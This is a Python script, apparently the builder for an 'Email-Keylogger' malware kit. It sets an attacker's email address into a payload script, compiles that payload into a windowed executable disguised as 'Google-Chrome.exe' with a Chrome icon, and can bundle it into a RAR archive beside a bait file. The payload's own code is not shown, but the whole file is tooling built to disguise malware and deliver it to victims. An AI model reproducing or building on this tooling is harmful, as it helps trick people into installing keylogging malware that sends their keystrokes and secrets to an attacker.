import time
import re
import os
import sys
from os.path import join
import shutil
import PyInstaller.__main__
import exe_to_rar

MALWARE_DEFAULT = "Google-Chrome.exe"
SEND_DEFAULT = "hoangquy0417@gmail.com"


def create_malware(icon, malware, name):
    print("\033[1;77m\033[0m\033[1;31m->\033[0m\033[1;77m Generating exe file...\033[0m")
    time.sleep(2)
    PyInstaller.__main__.run([
        malware,
        "--onefile" if True else "",
        "--windowed" if True else "",
        f"--distpath={os.getcwd()}",
        f"--icon={icon}" if icon else "",
        f"--name={name}",
    ])
    print("\033[1;77m\033[0m\033[1;31m->\033[0m\033[1;77m Exe created!\033[0m")


def exe2rar():
    print("\033[1;77m\033[0m\033[1;31m->\033[0m\033[1;77m Building malware binary\033[0m")
    time.sleep(2)
    f_embedded = input(
        '\033[1;31m\033[0m\033[1;77m->\033[0m\033[1;31m File embedded (Default:\033[0m\033[1;77m %s \033[0m\033[1;31m): \033[0m' % (
            exe_to_rar.BAIT_NAME))
    f_script = input(
        '\033[1;31m\033[0m\033[1;77m->\033[0m\033[1;31m File embedded (Default:\033[0m\033[1;77m %s \033[0m\033[1;31m): \033[0m' % (
            exe_to_rar.SCRIPT_NAME))
    f_name_out = input(
        '\033[1;31m\033[0m\033[1;77m->\033[0m\033[1;31m File embedded (Default:\033[0m\033[1;77m %s \033[0m\033[1;31m): \033[0m' % (
            exe_to_rar.OUTPUT_NAME))
    exe_to_rar.create_template_and_rar(f_embedded, f_script, f_name_out)
    print("\033[1;77m\033[0m\033[1;31m->\033[0m\033[1;77m embedded exe to rar\033[0m")


def get_full_path(file_name):
    # Lấy đường dẫn thư mục làm việc hiện tại
    current_folder = os.getcwd()

    # Kết hợp đường dẫn thư mục hiện tại và tên file để có đường dẫn đầy đủ
    full_path = os.path.join(current_folder, file_name)

    return full_path


def start():
    send_email = input(
        '\033[1;31m\033[0m\033[1;77m->\033[0m\033[1;31m Email attacker (Default:\033[0m\033[1;77m %s \033[0m\033[1;31m): \033[0m' % (
            SEND_DEFAULT))
    if send_email == "":
        send_email = SEND_DEFAULT
    name_file = input(
        '\033[1;31m\033[0m\033[1;77m->\033[0m\033[1;31m Name of Malware (Default:\033[0m\033[1;77m %s \033[0m\033[1;31m): \033[0m' % (
            MALWARE_DEFAULT))
    if name_file == "":
        name_file = MALWARE_DEFAULT
    _icon = "google_chrome_icon.ico"
    _name_malware = "send_email.py"
    path_malware = get_full_path(_name_malware)
    path_icon = get_full_path(_icon)
    with open(path_malware, 'r') as file:
        content = file.read()
    # Sử dụng biểu thức chính quy để tìm và thay thế nội dung sau dấu '='
    new_content = re.sub(r'(RECEIVER_EMAIL=")[^"]*(")', r'\1{}\2'.format(send_email), content)
    # Ghi nội dung mới vào file
    with open(path_malware, 'w') as file:
        file.write(new_content)
    create_malware(path_icon, path_malware, name_file)
    check_embedded_rar = input(
        '\033[1;31m\033[0m\033[1;77m->\033[0m\033[1;31m Are embedded to rar?\033[0m\033[1;77m [Y/n] \033[0m')
    if check_embedded_rar in "Y,yes,y,Yes":
        exe2rar()

def main():
    print("""   __                    _  _                             _                                  
  /__\ _ __ ___    __ _ (_)| |         /\ /\  ___  _   _ | |  ___    __ _   __ _   ___  _ __ 
 /_\  | '_ ` _ \  / _` || || | _____  / //_/ / _ \| | | || | / _ \  / _` | / _` | / _ \| '__|
//__  | | | | | || (_| || || ||_____|/ __ \ |  __/| |_| || || (_) || (_| || (_| ||  __/| |   
\__/  |_| |_| |_| \__,_||_||_|       \/  \/  \___| \__, ||_| \___/  \__, | \__, | \___||_|   
                                                   |___/            |___/  |___/             
""")
    start()
    pass


if __name__=="__main__":
    main()